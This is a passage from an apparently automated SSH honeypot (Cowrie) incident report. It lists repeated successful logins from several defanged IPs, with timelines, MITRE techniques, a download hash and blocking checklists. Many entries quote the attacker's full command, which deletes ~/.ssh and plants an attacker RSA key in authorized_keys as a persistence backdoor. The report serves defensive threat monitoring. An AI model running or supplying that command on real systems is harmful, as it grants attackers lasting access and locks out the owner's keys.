| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:31:54` | `cowrie.session.connect` |
| `2026-04-13 19:31:54` | `cowrie.client.version` |
| `2026-04-13 19:31:54` | `cowrie.client.kex` |
| `2026-04-13 19:31:55` | `cowrie.login.success` |
| `2026-04-13 19:31:55` | `cowrie.session.params` |
| `2026-04-13 19:31:55` | `cowrie.command.input` |
| `2026-04-13 19:31:55` | `cowrie.command.failed` |
| `2026-04-13 19:31:55` | `cowrie.log.closed` |
| `2026-04-13 19:31:55` | `cowrie.session.params` |
| `2026-04-13 19:31:55` | `cowrie.command.input` |
| `2026-04-13 19:31:56` | `cowrie.session.file_download` |
| `2026-04-13 19:31:56` | `cowrie.log.closed` |
| `2026-04-13 19:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d5dbdacb86

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-13 19:31 |
| **Last Seen** | 2026-04-13 19:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:31:58` | `cowrie.session.connect` |
| `2026-04-13 19:31:58` | `cowrie.client.version` |
| `2026-04-13 19:31:58` | `cowrie.client.kex` |
| `2026-04-13 19:31:58` | `cowrie.login.success` |
| `2026-04-13 19:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a474f658aa8

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-13 19:32 |
| **Last Seen** | 2026-04-13 19:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:32:00` | `cowrie.session.connect` |
| `2026-04-13 19:32:00` | `cowrie.client.version` |
| `2026-04-13 19:32:00` | `cowrie.client.kex` |
| `2026-04-13 19:32:01` | `cowrie.login.success` |
| `2026-04-13 19:32:02` | `cowrie.session.params` |
| `2026-04-13 19:32:02` | `cowrie.command.input` |
| `2026-04-13 19:32:02` | `cowrie.command.failed` |
| `2026-04-13 19:32:02` | `cowrie.log.closed` |
| `2026-04-13 19:32:02` | `cowrie.session.params` |
| `2026-04-13 19:32:02` | `cowrie.command.input` |
| `2026-04-13 19:32:02` | `cowrie.session.file_download` |
| `2026-04-13 19:32:02` | `cowrie.log.closed` |
| `2026-04-13 19:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e12b557798a7

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-13 19:32 |
| **Last Seen** | 2026-04-13 19:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:32:05` | `cowrie.session.connect` |
| `2026-04-13 19:32:05` | `cowrie.client.version` |
| `2026-04-13 19:32:05` | `cowrie.client.kex` |
| `2026-04-13 19:32:06` | `cowrie.login.success` |
| `2026-04-13 19:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8ea72992faf

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:33 |
| **Last Seen** | 2026-04-13 19:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:33:30` | `cowrie.session.connect` |
| `2026-04-13 19:33:30` | `cowrie.client.version` |
| `2026-04-13 19:33:30` | `cowrie.client.kex` |
| `2026-04-13 19:33:31` | `cowrie.login.success` |
| `2026-04-13 19:33:31` | `cowrie.session.params` |
| `2026-04-13 19:33:31` | `cowrie.command.input` |
| `2026-04-13 19:33:31` | `cowrie.command.failed` |
| `2026-04-13 19:33:31` | `cowrie.log.closed` |
| `2026-04-13 19:33:32` | `cowrie.session.params` |
| `2026-04-13 19:33:32` | `cowrie.command.input` |
| `2026-04-13 19:33:32` | `cowrie.session.file_download` |
| `2026-04-13 19:33:32` | `cowrie.log.closed` |
| `2026-04-13 19:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6d7c9e2b57

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:33 |
| **Last Seen** | 2026-04-13 19:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:33:35` | `cowrie.session.connect` |
| `2026-04-13 19:33:35` | `cowrie.client.version` |
| `2026-04-13 19:33:35` | `cowrie.client.kex` |
| `2026-04-13 19:33:36` | `cowrie.login.success` |
| `2026-04-13 19:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc6ed2b29ba

| Field | Detail |
|---|---|
| **Source IP** | `106.225.215[.]154` |
| **First Seen** | 2026-04-13 19:35 |
| **Last Seen** | 2026-04-13 19:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:35:54` | `cowrie.session.connect` |
| `2026-04-13 19:35:54` | `cowrie.client.version` |
| `2026-04-13 19:35:54` | `cowrie.client.kex` |
| `2026-04-13 19:35:55` | `cowrie.login.success` |
| `2026-04-13 19:35:55` | `cowrie.session.params` |
| `2026-04-13 19:35:55` | `cowrie.command.input` |
| `2026-04-13 19:35:55` | `cowrie.command.failed` |
| `2026-04-13 19:35:55` | `cowrie.log.closed` |
| `2026-04-13 19:35:55` | `cowrie.session.params` |
| `2026-04-13 19:35:55` | `cowrie.command.input` |
| `2026-04-13 19:35:56` | `cowrie.session.file_download` |
| `2026-04-13 19:35:56` | `cowrie.log.closed` |
| `2026-04-13 19:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.225.215[.]154` to AbuseIPDB if not already reported
- [ ] Block `106.225.215[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a98aec8e5e5

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:35 |
| **Last Seen** | 2026-04-13 19:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:35:55` | `cowrie.session.connect` |
| `2026-04-13 19:35:55` | `cowrie.client.version` |
| `2026-04-13 19:35:56` | `cowrie.client.kex` |
| `2026-04-13 19:35:56` | `cowrie.login.success` |
| `2026-04-13 19:35:57` | `cowrie.session.params` |
| `2026-04-13 19:35:57` | `cowrie.command.input` |
| `2026-04-13 19:35:57` | `cowrie.command.failed` |
| `2026-04-13 19:35:57` | `cowrie.log.closed` |
| `2026-04-13 19:35:57` | `cowrie.session.params` |
| `2026-04-13 19:35:57` | `cowrie.command.input` |
| `2026-04-13 19:35:58` | `cowrie.session.file_download` |
| `2026-04-13 19:35:58` | `cowrie.log.closed` |
| `2026-04-13 19:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db9701159e44

| Field | Detail |
|---|---|
| **Source IP** | `106.225.215[.]154` |
| **First Seen** | 2026-04-13 19:35 |
| **Last Seen** | 2026-04-13 19:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:35:58` | `cowrie.session.connect` |
| `2026-04-13 19:35:58` | `cowrie.client.version` |
| `2026-04-13 19:35:58` | `cowrie.client.kex` |
| `2026-04-13 19:35:58` | `cowrie.login.success` |
| `2026-04-13 19:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.225.215[.]154` to AbuseIPDB if not already reported
- [ ] Block `106.225.215[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-911fd8695c21

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:36 |
| **Last Seen** | 2026-04-13 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:36:00` | `cowrie.session.connect` |
| `2026-04-13 19:36:00` | `cowrie.client.version` |
| `2026-04-13 19:36:00` | `cowrie.client.kex` |
| `2026-04-13 19:36:01` | `cowrie.login.success` |
| `2026-04-13 19:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-551de7052ae5

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 19:36 |
| **Last Seen** | 2026-04-13 19:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:36:31` | `cowrie.session.connect` |
| `2026-04-13 19:36:31` | `cowrie.client.version` |
| `2026-04-13 19:36:31` | `cowrie.client.kex` |
| `2026-04-13 19:36:32` | `cowrie.login.success` |
| `2026-04-13 19:36:33` | `cowrie.session.params` |
| `2026-04-13 19:36:33` | `cowrie.command.input` |
| `2026-04-13 19:36:33` | `cowrie.command.failed` |
| `2026-04-13 19:36:33` | `cowrie.log.closed` |
| `2026-04-13 19:36:34` | `cowrie.session.params` |
| `2026-04-13 19:36:34` | `cowrie.command.input` |
| `2026-04-13 19:36:35` | `cowrie.session.file_download` |
| `2026-04-13 19:36:35` | `cowrie.log.closed` |
| `2026-04-13 19:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e663bf801efb

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 19:36 |
| **Last Seen** | 2026-04-13 19:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:36:38` | `cowrie.session.connect` |
| `2026-04-13 19:36:38` | `cowrie.client.version` |
| `2026-04-13 19:36:39` | `cowrie.client.kex` |
| `2026-04-13 19:36:40` | `cowrie.login.success` |
| `2026-04-13 19:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55c2d68b8a95

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:38 |
| **Last Seen** | 2026-04-13 19:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:38:22` | `cowrie.session.connect` |
| `2026-04-13 19:38:22` | `cowrie.client.version` |
| `2026-04-13 19:38:22` | `cowrie.client.kex` |
| `2026-04-13 19:38:23` | `cowrie.login.success` |
| `2026-04-13 19:38:24` | `cowrie.session.params` |
| `2026-04-13 19:38:24` | `cowrie.command.input` |
| `2026-04-13 19:38:24` | `cowrie.command.failed` |
| `2026-04-13 19:38:24` | `cowrie.log.closed` |
| `2026-04-13 19:38:24` | `cowrie.session.params` |
| `2026-04-13 19:38:24` | `cowrie.command.input` |
| `2026-04-13 19:38:24` | `cowrie.session.file_download` |
| `2026-04-13 19:38:24` | `cowrie.log.closed` |
| `2026-04-13 19:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed8e08af558d

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 19:38 |
| **Last Seen** | 2026-04-13 19:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:38:26` | `cowrie.session.connect` |
| `2026-04-13 19:38:26` | `cowrie.client.version` |
| `2026-04-13 19:38:26` | `cowrie.client.kex` |
| `2026-04-13 19:38:28` | `cowrie.login.success` |
| `2026-04-13 19:38:28` | `cowrie.session.params` |
| `2026-04-13 19:38:28` | `cowrie.command.input` |
| `2026-04-13 19:38:28` | `cowrie.command.failed` |
| `2026-04-13 19:38:29` | `cowrie.log.closed` |
| `2026-04-13 19:38:30` | `cowrie.session.params` |
| `2026-04-13 19:38:30` | `cowrie.command.input` |
| `2026-04-13 19:38:30` | `cowrie.session.file_download` |
| `2026-04-13 19:38:30` | `cowrie.log.closed` |
| `2026-04-13 19:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff392e578e79

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:38 |
| **Last Seen** | 2026-04-13 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:38:27` | `cowrie.session.connect` |
| `2026-04-13 19:38:27` | `cowrie.client.version` |
| `2026-04-13 19:38:27` | `cowrie.client.kex` |
| `2026-04-13 19:38:28` | `cowrie.login.success` |
| `2026-04-13 19:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c8a1bf73b15

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 19:38 |
| **Last Seen** | 2026-04-13 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:38:34` | `cowrie.session.connect` |
| `2026-04-13 19:38:34` | `cowrie.client.version` |
| `2026-04-13 19:38:34` | `cowrie.client.kex` |
| `2026-04-13 19:38:35` | `cowrie.login.success` |
| `2026-04-13 19:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be7a9db80bf7

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:43 |
| **Last Seen** | 2026-04-13 19:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:43:17` | `cowrie.session.connect` |
| `2026-04-13 19:43:17` | `cowrie.client.version` |
| `2026-04-13 19:43:17` | `cowrie.client.kex` |
| `2026-04-13 19:43:17` | `cowrie.login.success` |
| `2026-04-13 19:43:18` | `cowrie.session.params` |
| `2026-04-13 19:43:18` | `cowrie.command.input` |
| `2026-04-13 19:43:18` | `cowrie.command.failed` |
| `2026-04-13 19:43:18` | `cowrie.log.closed` |
| `2026-04-13 19:43:18` | `cowrie.session.params` |
| `2026-04-13 19:43:18` | `cowrie.command.input` |
| `2026-04-13 19:43:19` | `cowrie.session.file_download` |
| `2026-04-13 19:43:19` | `cowrie.log.closed` |
| `2026-04-13 19:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03a2cbe14463

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:43 |
| **Last Seen** | 2026-04-13 19:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

